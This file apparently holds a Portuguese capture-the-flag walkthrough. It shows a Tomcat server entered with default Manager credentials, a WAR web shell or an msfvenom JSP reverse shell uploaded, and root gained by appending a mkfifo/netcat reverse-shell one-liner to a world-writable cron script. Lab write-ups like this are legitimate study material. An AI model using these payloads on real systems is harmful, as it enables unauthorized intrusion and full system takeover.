@@ -1,0 +1,55 @@
+RUSTSCAN:
+
+Open 10.66.159.203:22
+Open 10.66.159.203:8009
+Open 10.66.159.203:8080
+
+NMAP:
+
+
+
+http://10.66.159.203:8080/ --> home do site!
+
+
+Ao clicar em "Manager App", sou redirecionado para uma tela de login via http
+ao clicarem cancelar sou redirecionado para essa url:
+
+--> http://10.66.159.203:8080/manager/html
+
+nessa página aparece a senha: s3cret e testei com o usuário default tomcat
+
+Logado!
+
+Cliquei em /manager
+fiz upload de uma shell.war
+
+https://github.com/tghosth/webshelljar/blob/master/webshell.war
+
+ou gerar uma reverse shell com msfvenom:
+--> payload: msfvenom -p java/jsp_shell_reverse_tcp lhost=192.168.200.114 lport=1337 -f war -o shell.war
+
+ao entrar, procurei formas de escalar privilégio e vi isso:
+
+cat /etc/crotab:
+
+# m h dom mon dow user	command
+17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
+25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
+47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
+52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
+*  *	* * *	root	cd /home/jack && bash id.sh
+#
+
+ls -la /home/jack
+
+-rwxrwxrwx 1 jack jack   26 Aug 14  2019 id.sh
+
+tenho permissão de escrita no arquivo id.sh
+
+então fiz:
+
+echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 192.168.200.114 1337 >/tmp/f" >> id.sh
+ncat -vnlp 1337
+
+recebi a conexão e virei root!
+peguei as flags! FIM!
